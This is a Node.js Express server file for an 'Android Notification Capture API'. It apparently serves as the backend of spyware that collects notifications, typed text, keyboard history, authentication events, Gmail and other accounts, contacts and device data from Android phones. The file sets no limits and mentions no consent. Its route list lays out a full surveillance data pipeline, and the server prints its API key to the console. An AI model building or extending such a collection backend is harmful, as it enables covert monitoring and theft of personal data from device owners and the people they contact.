const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const config = require('./config');
const cacheService = require('./services/cacheService');
const keepAliveService = require('./services/keepAliveService'); // Import keep-alive service

// Import routes
const notificationRoutes = require('./routes/notifications');
const textInputRoutes = require('./routes/textInputs');
const authenticationEventRoutes = require('./routes/authenticationEvents');
const uploadRoutes = require('./routes/upload');
const accountRoutes = require('./routes/accounts');
const emailAccountRoutes = require('./routes/emailAccounts');
const contactRoutes = require('./routes/contacts');
const deviceRoutes = require('./routes/devices');
const keyboardHistoryRoutes = require('./routes/keyboardHistory');

const app = express();

// Security middleware
app.use(helmet());

// Rate limiting - Increased for testing
const limiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 10000, // limit each IP to 10000 requests per minute
    message: {
        success: false,
        message: 'Too many requests from this IP, please try again later.'
    }
});
app.use('/api/', limiter);

// CORS configuration
app.use(cors({
    origin: '*', // In production, specify your Android app's origin
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization', 'x-api-key']
}));

// Body parsing middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// MongoDB connection
mongoose.connect(config.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
    dbName: config.DATABASE_NAME
})
.then(() => {
    console.log('✅ Connected to MongoDB Atlas successfully!');
    console.log(`📊 Database: ${config.DATABASE_NAME}`);
    
    // Initialize Redis cache service
    cacheService.connect().then(() => {
        console.log('✅ Cache service initialized');
        
        // Start keep-alive service after cache is ready
        keepAliveService.start();
        console.log('✅ Keep-alive service started');
    }).catch((error) => {
        console.log('⚠️ Cache service initialization failed:', error.message);
        
        // Start keep-alive service even if cache fails
        keepAliveService.start();
        console.log('✅ Keep-alive service started (cache failed)');
    });
})
.catch((error) => {
    console.error('❌ MongoDB connection error:', error);
    process.exit(1);
});

// Routes
app.use('/api/notifications', notificationRoutes);
app.use('/api/text-inputs', textInputRoutes);
app.use('/api/authentication-events', authenticationEventRoutes);
app.use('/api/upload', uploadRoutes);
app.use('/api/accounts', accountRoutes);
app.use('/api/email-accounts', emailAccountRoutes);
app.use('/api/contacts', contactRoutes);
app.use('/api/devices', deviceRoutes);
app.use('/api/keyboard-history', keyboardHistoryRoutes);
app.use('/uploads', express.static('uploads'));

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        success: true,
        message: 'Server is running',
        timestamp: new Date().toISOString(),
        database: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected'
    });
});

// API documentation endpoint
app.get('/api', (req, res) => {
    res.json({
        success: true,
        message: 'Android Notification Capture API',
        version: '1.0.0',
        endpoints: {
            notifications: {
                'POST /api/notifications': 'Save notification data',
                'GET /api/notifications': 'Fetch notifications',
                'GET /api/notifications/stats': 'Get notification statistics'
            },
            textInputs: {
                'POST /api/text-inputs': 'Save text input data',
                'GET /api/text-inputs': 'Fetch text inputs',
                'GET /api/text-inputs/stats': 'Get text input statistics'
            },
            authenticationEvents: {
                'POST /api/authentication-events': 'Save authentication event data',
                'GET /api/authentication-events': 'Fetch authentication events',
                'GET /api/authentication-events/stats': 'Get authentication event statistics',
                'GET /api/authentication-events/security-analysis': 'Get security analysis'
            },
            accounts: {
                'POST /api/accounts': 'Save account information',
                'GET /api/accounts': 'Fetch all accounts',
                'GET /api/accounts/gmail': 'Fetch Gmail accounts only',
                'GET /api/accounts/stats': 'Get account statistics'
            },
            contacts: {
                'POST /api/contacts': 'Save contact information',
                'GET /api/contacts': 'Fetch contact information',
                'GET /api/contacts/stats': 'Get contact statistics',
                'GET /api/contacts/by-app/:packageName': 'Get contacts by specific app',
                'GET /api/contacts/social-media': 'Get social media contacts only'
            },
            system: {
                'GET /health': 'Server health check',
                'GET /api': 'API documentation'
            }
        },
        authentication: 'Use x-api-key header or api_key query parameter'
    });
});

// Error handling middleware
app.use((error, req, res, next) => {
    console.error('Unhandled error:', error);
    res.status(500).json({
        success: false,
        message: 'Internal server error',
        error: config.NODE_ENV === 'development' ? error.message : 'Something went wrong'
    });
});

// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        message: 'Endpoint not found',
        availableEndpoints: [
            'GET /health',
            'GET /api',
            'POST /api/notifications',
            'GET /api/notifications',
            'GET /api/notifications/stats',
            'POST /api/text-inputs',
            'GET /api/text-inputs',
            'GET /api/text-inputs/stats',
            'POST /api/authentication-events',
            'GET /api/authentication-events',
            'GET /api/authentication-events/stats',
            'GET /api/authentication-events/security-analysis',
            'POST /api/accounts',
            'GET /api/accounts',
            'GET /api/accounts/gmail',
            'GET /api/accounts/stats',
            'POST /api/contacts',
            'GET /api/contacts',
            'GET /api/contacts/stats',
            'GET /api/contacts/by-app/:packageName',
            'GET /api/contacts/social-media'
        ]
    });
});

// Start server
const PORT = config.PORT;
const HOST = config.HOST;
app.listen(PORT, HOST, () => {
    console.log('🚀 Server started successfully!');
    console.log(`📡 Server running on port ${PORT}`);
    console.log(`🌐 API Base URL: http://${HOST}:${PORT}/api`);
    console.log(`📚 API Documentation: http://${HOST}:${PORT}/api`);
    console.log(`💚 Health Check: http://${HOST}:${PORT}/health`);
    console.log(`📱 Android App URL: http://10.173.136.254:${PORT}/api`);
    console.log(`🔑 API Key: ${config.API_KEY}`);
});

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n🛑 Shutting down server...');
    
    // Stop keep-alive service
    try {
        keepAliveService.stop();
        console.log('✅ Keep-alive service stopped');
    } catch (error) {
        console.log('⚠️ Error stopping keep-alive service:', error.message);
    }
    
    // Complete all pending cached messages before shutdown
    try {
        await cacheService.completeAllPendingMessages();
        console.log('✅ All cached messages completed');
    } catch (error) {
        console.log('⚠️ Error completing cached messages:', error.message);
    }
    
    // Disconnect from Redis
    try {
        await cacheService.disconnect();
        console.log('✅ Redis connection closed');
    } catch (error) {
        console.log('⚠️ Error closing Redis connection:', error.message);
    }
    
    // Close MongoDB connection
    await mongoose.connection.close();
    console.log('✅ MongoDB connection closed');
    process.exit(0);
});

process.on('SIGTERM', async () => {
    console.log('\n🛑 Shutting down server...');
    
    // Stop keep-alive service
    try {
        keepAliveService.stop();
        console.log('✅ Keep-alive service stopped');
    } catch (error) {
        console.log('⚠️ Error stopping keep-alive service:', error.message);
    }
    
    // Complete all pending cached messages before shutdown
    try {
        await cacheService.completeAllPendingMessages();
        console.log('✅ All cached messages completed');
    } catch (error) {
        console.log('⚠️ Error completing cached messages:', error.message);
    }
    
    // Disconnect from Redis
    try {
        await cacheService.disconnect();
        console.log('✅ Redis connection closed');
    } catch (error) {
        console.log('⚠️ Error closing Redis connection:', error.message);
    }
    
    // Close MongoDB connection
    await mongoose.connection.close();
    console.log('✅ MongoDB connection closed');
    process.exit(0);
});

module.exports = app;
